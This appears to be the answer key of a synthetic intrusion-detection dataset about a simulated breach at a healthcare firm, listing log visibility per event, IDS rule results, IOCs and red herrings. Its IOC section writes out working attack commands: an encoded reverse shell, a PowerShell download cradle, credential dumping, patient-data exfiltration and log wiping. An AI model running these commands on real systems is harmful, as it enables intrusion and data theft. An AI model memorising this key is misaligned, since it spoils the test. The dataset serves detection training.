| a41527d7-9f88-4299-ba35-09cb65fa2326 | ids | delayed: 1 |
| a4550c9b-faa4-46e7-ad81-60be7412ece8 | ids | delayed: 1 |
| a6fbccfb-2a98-40aa-ad4a-e3074a83ffb8 | ids | delayed: 1 |
| a7d6da11-9d93-419f-a4c8-656cc723a68e | ids | delayed: 1 |
| a8e8fc4f-29dd-4c9d-b092-75ce377f54f7 | ids | delayed: 1 |
| aa13d245-42b8-40ae-97e3-997d316a4971 | ids | delayed: 2 |
| aacfcd3b-7956-49d4-8430-d0a9744bd720 | ids | delayed: 1 |
| ab320fba-dc60-40f8-b500-47acefb072d3 | ids | delayed: 2 |
| b2ef6903-5c99-42aa-b445-332a77e260ed | ids | delayed: 1 |
| b887c502-6e4a-4d35-a304-a868682513b2 | ids | delayed: 1 |
| b9f449c9-6706-4051-80c5-8929d4cb85a7 | ids | delayed: 1 |
| bfd2838a-eeb0-4fd8-b018-fc7508bbafd5 | ids | delayed: 2 |
| c10e1647-9d34-4b5f-bfa4-6c0e717a07ef | ids | delayed: 1 |
| c144af5c-33cd-407b-a4e9-06c2d45486da | ids | delayed: 1 |
| c24e3eed-8c04-4ba8-bd58-31cd4b640b9e | ids | delayed: 2 |
| c2ef40ef-e6d6-43bf-87fe-1651bf5ff5fb | ids | delayed: 1 |
| c552e16d-6a69-4dde-87dc-e0c04c2399fa | ids | delayed: 2 |
| c5f0c2db-3044-4833-85a4-f4e804329a73 | ids | delayed: 1 |
| c64d0b47-de25-43f4-ba25-b4566951631a | ids | delayed: 1 |
| c87f9c00-3544-43b2-b197-4af02326d6d1 | ids | delayed: 1 |
| cb9317b7-cad6-4c53-a7a7-06165e7a5a73 | ids | delayed: 1 |
| ccb581ba-dea8-408a-b762-18e44545fb3f | ids | delayed: 1 |
| ccfb2073-6509-4f78-9365-73ab4f9cab5d | ids | delayed: 1 |
| cdb02a3e-8d45-4621-a599-53b5d713a88a | ids | delayed: 1 |
| d0aa5906-a7a2-46d2-85a1-adb64139329d | ids | delayed: 1 |
| d19ebfe8-abd4-4db6-b766-2af9ce926616 | ids | delayed: 1 |
| d61f8a7c-e15c-42c2-bada-6dbb67b577e1 | ids | delayed: 1 |
| d7a9e740-d3a2-4e14-855d-0c157f544303 | ids | delayed: 1 |
| d7ac9b0c-9893-493a-9c40-297b76773a3c | ids | delayed: 2 |
| dc2fc631-a091-47ea-906c-e4f32e8dabc1 | ids | delayed: 1 |
| ddb5bdf9-b0eb-47cf-8ff8-962615ace593 | ids | delayed: 1 |
| e02586d6-afd1-4620-b4f4-3f9f42a9f16b | ids | delayed: 1 |
| e51a6a39-12bc-4524-a08a-b026d5fd9f61 | ids | delayed: 1 |
| e961d22e-fb60-41b0-96a0-e260c7272264 | ids | delayed: 2 |
| ed7bca70-43a6-47d0-a09c-6ea0f9c304ba | ids | delayed: 1 |
| ef697da4-8e0c-483a-82ed-e2e79e320be3 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6, filtered: 1 |
| evt-001 | ecar | delayed: 3 |
| evt-001 | ids | filtered: 1 |
| evt-001 | zeek | delayed: 5, filtered: 8 |
| evt-002 | asa | delayed: 415, filtered: 1, visible: 4 |
| evt-002 | ecar | delayed: 414, dropped: 6 |
| evt-002 | ids | delayed: 13, visible: 1 |
| evt-002 | web | delayed: 367, dropped: 2, visible: 1 |
| evt-002 | zeek | delayed: 599, dropped: 2, filtered: 2, visible: 188 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | visible: 4 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 2, visible: 1 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 56 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 10 |
| evt-006 | windows_security | delayed: 5 |
| evt-006 | zeek | delayed: 21, visible: 10 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 4, filtered: 1 |
| evt-008 | ecar | delayed: 7, dropped: 1 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 3 |
| evt-008 | zeek | delayed: 5, visible: 3 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 3, filtered: 5 |
| evt-012 | ecar | delayed: 13 |
| evt-012 | sysmon | delayed: 3 |
| evt-012 | windows_security | delayed: 20 |
| evt-012 | zeek | delayed: 7, visible: 3 |
| evt-013 | asa | delayed: 4, filtered: 1 |
| evt-013 | ecar | delayed: 34, dropped: 9 |
| evt-013 | sysmon | delayed: 39 |
| evt-013 | windows_security | delayed: 17 |
| evt-013 | zeek | delayed: 3, visible: 5 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 2, visible: 2 |
| evt-016 | ecar | delayed: 35 |
| evt-016 | sysmon | delayed: 35 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 33 |
| evt-017 | sysmon | delayed: 32 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 25, visible: 1 |
| evt-018 | ecar | delayed: 34 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 17 |
| evt-018 | zeek | delayed: 51, dropped: 1, visible: 16 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 6, out_of_window: 2 |
| evt-020 | asa | delayed: 27, filtered: 257, visible: 1 |
| evt-020 | ecar | delayed: 285 |
| evt-020 | ids | delayed: 6, filtered: 243 |
| evt-020 | sysmon | delayed: 21 |
| evt-020 | windows_security | delayed: 304, visible: 1 |
| evt-020 | zeek | delayed: 412, dropped: 2, filtered: 2, visible: 154 |
| evt-021 | asa | delayed: 91 |
| evt-021 | ecar | delayed: 88, dropped: 3 |
| evt-021 | ids | delayed: 18, filtered: 164 |
| evt-021 | windows_security | delayed: 90, dropped: 1 |
| evt-021 | zeek | delayed: 128, visible: 54 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 39 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 6, visible: 2 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 4 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 8 |
| evt-026 | asa | delayed: 3, filtered: 3 |
| evt-026 | ecar | delayed: 7 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | zeek | delayed: 12, visible: 2 |
| evt-027 | ecar | dropped: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 27 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 26 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 2, visible: 4 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 4, visible: 2 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 10 |
| evt-033 | sysmon | delayed: 9 |
| evt-033 | windows_security | delayed: 10 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 6, filtered: 2 |
| evt-email-001 | ecar | delayed: 43 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 36 |
| evt-email-001 | windows_security | delayed: 8 |
| evt-email-001 | zeek | delayed: 13, visible: 4 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 2 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 1 |
| evt-email-002 | zeek | visible: 4 |
| evt-email-003 | asa | delayed: 5, filtered: 2 |
| evt-email-003 | ecar | delayed: 22 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 21 |
| evt-email-003 | windows_security | delayed: 12 |
| evt-email-003 | zeek | delayed: 10, dropped: 1, visible: 7 |
| evt-email-004 | asa | delayed: 10, filtered: 2 |
| evt-email-004 | ecar | delayed: 28 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 12 |
| evt-email-004 | windows_security | delayed: 10 |
| evt-email-004 | zeek | delayed: 22, visible: 10 |
| evt-email-005 | asa | delayed: 2, visible: 1 |
| evt-email-005 | ecar | delayed: 3 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 2 |
| evt-email-005 | zeek | delayed: 6 |
| evt-email-006 | asa | delayed: 4 |
| evt-email-006 | ecar | delayed: 7 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 6 |
| evt-email-006 | windows_security | delayed: 5 |
| evt-email-006 | zeek | delayed: 11 |
| evt-email-007 | asa | delayed: 6, filtered: 1 |
| evt-email-007 | ecar | delayed: 12 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 4 |
| evt-email-007 | zeek | delayed: 13, visible: 9 |
| evt-email-008 | asa | delayed: 8, filtered: 3 |
| evt-email-008 | ecar | delayed: 32 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 26 |
| evt-email-008 | windows_security | delayed: 12 |
| evt-email-008 | zeek | delayed: 15, visible: 13 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | visible: 2 |
| evt-email-010 | asa | delayed: 2 |
| evt-email-010 | ecar | delayed: 2 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5, visible: 4 |
| evt-email-011 | asa | delayed: 4, filtered: 2 |
| evt-email-011 | ecar | delayed: 10 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 7 |
| evt-email-011 | sysmon | delayed: 6 |
| evt-email-011 | windows_security | delayed: 6 |
| evt-email-011 | zeek | delayed: 17, visible: 2 |
| f18cdfbc-1583-46e4-9831-58c8c6a29a35 | ids | delayed: 1 |
| f1c2e91e-5558-471e-ba23-c104b33142b7 | ids | delayed: 1 |
| f293f9e7-aebc-428e-8b7e-539d6ea09cee | ids | delayed: 2 |
| f344ed0f-b68a-44d9-ab6d-1de00df12d51 | ids | delayed: 1 |
| f76058d0-ca06-42ea-b484-fe78dc5696bf | ids | delayed: 1 |
| fa0fdfc4-e22c-4f2c-8c28-013ebb5f9b02 | ids | delayed: 1 |
| fb844ac2-ee24-4004-b0ee-263dcbc19815 | ids | delayed: 1 |
| fccaacb5-bbac-4ace-9aad-7c28315ca054 | ids | delayed: 1 |
| fdf339ce-5210-471f-8d05-6d0615e79196 | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 4 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 33 |
| red_herring:rh-002 | sysmon | delayed: 32 |
| red_herring:rh-002 | windows_security | delayed: 8 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 4 |
| red_herring:rh-003 | ecar | delayed: 7 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | windows_security | delayed: 2 |
| red_herring:rh-003 | zeek | delayed: 4, visible: 4 |


## IDS Evaluation Summary

Observation totals: delayed=221, filtered=408, visible=5.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 1 | 1 | 0 | built_in=1 | `812332b7bcc8` |
| snort-core | 1:2000357 | 1 | 1 | 0 | built_in=1 | `7648a8b6e8de` |
| snort-core | 1:2000560 | 3 | 3 | 0 | built_in=3 | `438cc1a7e915` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `f0f32db67f48` |
| snort-core | 1:2016149 | 3 | 3 | 0 | built_in=3 | `a78313bd7449` |
| snort-core | 1:2024291 | 9 | 9 | 0 | built_in=9 | `e2d639537f18` |
| snort-core | 1:2027757 | 10 | 10 | 0 | built_in=10 | `2ca6fa6c075a` |
| snort-core | 1:2027863 | 6 | 6 | 0 | built_in=6 | `57c9914f1a24` |
| snort-core | 1:2027865 | 104 | 22 | 82 | authored_attachment=9, built_in=13 | `e2e18d904add` |
| snort-core | 1:2029706 | 259 | 16 | 243 | authored_attachment=6, built_in=10 | `4989911b8cd9` |
| snort-core | 1:382 | 1 | 1 | 0 | built_in=1 | `e88eb2413f85` |
| snort-perimeter | 1:2000357 | 1 | 1 | 0 | built_in=1 | `fb7363012ce4` |
| snort-perimeter | 1:2000428 | 2 | 2 | 0 | built_in=2 | `065bbf0435b1` |
| snort-perimeter | 1:2000560 | 2 | 2 | 0 | built_in=2 | `f3368bc66cb1` |
| snort-perimeter | 1:2000575 | 13 | 13 | 0 | built_in=13 | `42ada3f3b3bb` |
| snort-perimeter | 1:2002910 | 14 | 14 | 0 | built_in=14 | `ada6e7b2355c` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `82f7410a99ce` |
| snort-perimeter | 1:2003068 | 5 | 5 | 0 | built_in=5 | `f661a68f2cd0` |
| snort-perimeter | 1:2010935 | 1 | 1 | 0 | built_in=1 | `9732af7ddf68` |
| snort-perimeter | 1:2013028 | 3 | 3 | 0 | built_in=3 | `a64352c82da4` |
| snort-perimeter | 1:2013504 | 3 | 3 | 0 | authored_attachment=1, built_in=2 | `5ef9d9c53f36` |
| snort-perimeter | 1:2016149 | 9 | 9 | 0 | built_in=9 | `753abf9bf83c` |
| snort-perimeter | 1:2016360 | 10 | 10 | 0 | built_in=10 | `143f087a9d3d` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `301be3a69ddf` |
| snort-perimeter | 1:2022476 | 4 | 4 | 0 | built_in=4 | `bd85b9c48bb1` |
| snort-perimeter | 1:2023672 | 4 | 4 | 0 | built_in=4 | `32291500f686` |
| snort-perimeter | 1:2023882 | 4 | 4 | 0 | built_in=4 | `fb2208e91eb0` |
| snort-perimeter | 1:2024290 | 2 | 2 | 0 | built_in=2 | `8de8c16e340d` |
| snort-perimeter | 1:2024291 | 6 | 6 | 0 | built_in=6 | `46dfe2b3f7b5` |
| snort-perimeter | 1:2024392 | 3 | 3 | 0 | built_in=3 | `94564ba44e6b` |
| snort-perimeter | 1:2024897 | 1 | 1 | 0 | built_in=1 | `abc7d0a44a86` |
| snort-perimeter | 1:2025712 | 4 | 4 | 0 | built_in=4 | `35833a04c587` |
| snort-perimeter | 1:2025991 | 4 | 4 | 0 | built_in=4 | `3c18cd71497b` |
| snort-perimeter | 1:2027316 | 3 | 3 | 0 | built_in=3 | `07b0df87a8a9` |
| snort-perimeter | 1:2027757 | 6 | 6 | 0 | built_in=6 | `6eda52873a33` |
| snort-perimeter | 1:2027863 | 4 | 4 | 0 | built_in=4 | `59f800d751a6` |
| snort-perimeter | 1:2027865 | 100 | 18 | 82 | authored_attachment=9, built_in=9 | `f9174fa2f6af` |
| snort-perimeter | 1:2028401 | 8 | 8 | 0 | built_in=8 | `24b84903bf81` |
| snort-perimeter | 1:2029706 | 8 | 8 | 0 | built_in=8 | `786e14ecd65e` |
| snort-perimeter | 1:366 | 4 | 4 | 0 | built_in=4 | `7e670c7773bb` |
| snort-perimeter | 1:382 | 2 | 2 | 0 | built_in=2 | `e158bf1894ac` |
| snort-perimeter | 1:384 | 2 | 2 | 0 | built_in=2 | `67a34ca9e394` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C0tLrUX9gRHdA5J2fG
- SMTP Zeek UID: C2r0RvECvKW7cw7A8T
- SMTP Zeek UID: CAVoxTrikprzpMinhm
- SMTP Zeek UID: CFzixYYhFsnSEYGfc1
- SMTP Zeek UID: CHwuDTJkOo5GvGEaG
- SMTP Zeek UID: CIUP0ifBL06KduFJzCG
- SMTP Zeek UID: CNbuuERbMzeAPgBTd
- SMTP Zeek UID: CP588ZMkofiubntU9
- SMTP Zeek UID: CY2zEGq5MXsiGjXngB
- SMTP Zeek UID: CaCEiSkF0RSmnr0Ors
- SMTP Zeek UID: CaY63CGHpcoyZaYkD
- SMTP Zeek UID: CjkKImJPkZQtrhIkETn
- SMTP Zeek UID: CmpTh9BmBD1ld4Dlgq9
- SMTP Zeek UID: CopoQu6jSulEbeHjkG
- SMTP Zeek UID: Czs7cOLS3JqpolLbC
- Zeek UID: C1k38wjeOGgN1v5oQy
- Zeek UID: CAf21golmOj6JX6wwpF
- Zeek UID: CE5MbORpEh93YSyJdN
- Zeek UID: CIDf0uoJhaNK97C3A59
- Zeek UID: CaP9ZxLxYcT3tcdBcB
- Zeek UID: CdQx8lMbL9xwqbGFD
- Zeek UID: CgPFUdaceuqZ6vyIu4
- Zeek UID: Chn03ErTtgqGWYsgc
- Zeek UID: Cm3ehy7IoBDKiVKD6k
- Zeek UID: CzRN5LIdcz2A9mLUFm
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:44 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:46 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:49 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:51 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:48 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:38 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:45 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:47 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
